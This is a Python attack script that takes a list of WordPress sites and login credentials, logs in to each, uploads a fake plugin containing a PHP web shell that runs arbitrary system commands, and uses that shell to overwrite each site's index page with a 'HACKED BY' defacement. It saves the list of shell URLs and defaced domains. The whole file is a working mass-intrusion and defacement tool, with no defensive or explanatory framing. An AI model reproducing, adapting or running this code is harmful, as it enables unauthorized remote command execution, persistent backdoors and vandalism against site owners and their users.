import sys, requests, re, os, json, zipfile, io
from colorama import Fore, Style, init
init(autoreset=True)

fr, fg, fy, fc, fo = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA

PHP_SHELL = '''<?php
set_time_limit(0);
error_reporting(0);
echo "<h1>Shell by Ambatuzx7</h1>";
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
<form method="get">
<input type="text" name="cmd" placeholder="command">
<input type="submit" value="Execute">
</form>'''

DEFACE_HTML = '''<html>
<body style="background:black;color:red;text-align:center">
<h1>HACKED BY AMBATUZX7</h1>
<p>Your security is weak!</p>
<h3>@ambatuzx7 - Was Here</h3>
</body></html>'''

def create_zip():
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as z:
        z.writestr('plugin/plugin.php', PHP_SHELL)
    return zip_buffer.getvalue()

def main():
    print(f"{fg}[+] WordPress Auto Shell & Deface")
    
    if len(sys.argv) != 2:
        print(f"{fr}Usage: python {sys.argv[0]} wp.json")
        return
    
    try:
        with open(sys.argv[1]) as f:
            sites = json.load(f)
    except:
        print(f"{fr}Invalid JSON file!")
        return
    
    zip_data = create_zip()
    shells, defaced = [], []
    
    for site in sites:
        try:
            domain = site['url'].replace('/wp-login.php', '')
            user, pwd = site['username'], site['password']
            
            print(f"\n{fc}[*] Trying: {domain}")
            print(f"{fy}User: {user} | Pass: {pwd}")
            
            s = requests.Session()
            
            # Login
            login_data = {'log': user, 'pwd': pwd, 'wp-submit': 'Log In'}
            s.post(domain + '/wp-login.php', data=login_data, timeout=10)
            
            # Check if logged in
            admin = s.get(domain + '/wp-admin/', timeout=10)
            if 'profile.php' not in admin.text:
                print(f"{fr}Login failed")
                continue
            
            print(f"{fg}Login success")
            
            # Get nonce for upload
            upload_page = s.get(domain + '/wp-admin/plugin-install.php?tab=upload', timeout=10)
            nonce = re.findall(r'name="_wpnonce" value="(.*?)"', upload_page.text)
            if not nonce:
                print(f"{fr}No upload nonce")
                continue
            
            # Upload plugin
            files = {'pluginzip': ('plugin.zip', zip_data, 'application/zip')}
            data = {'_wpnonce': nonce[0], 'install-plugin-submit': 'Install Now'}
            s.post(domain + '/wp-admin/update.php?action=upload-plugin', data=data, files=files, timeout=10)
            
            # Check shell
            shell_url = domain + '/wp-content/plugins/plugin/plugin.php'
            check = requests.get(shell_url, timeout=10)
            if 'Shell by Ambatuzx7' in check.text:
                print(f"{fg}Shell uploaded: {shell_url}")
                shells.append(shell_url)
                
                # Deface
                s.post(shell_url, data={'cmd': f'echo \'{DEFACE_HTML}\' > ../../index.html'}, timeout=10)
                print(f"{fg}Defaced: {domain}/index.html")
                defaced.append(domain)
            
        except Exception as e:
            print(f"{fr}Error: {str(e)}")
            continue
    
    # Save results
    with open('shells.txt', 'w') as f:
        f.write('\n'.join(shells))
    with open('defaced.txt', 'w') as f:
        f.write('\n'.join(defaced))
    
    print(f"\n{fg}Done! Shells: {len(shells)}, Defaced: {len(defaced)}")

if __name__ == "__main__":
    main()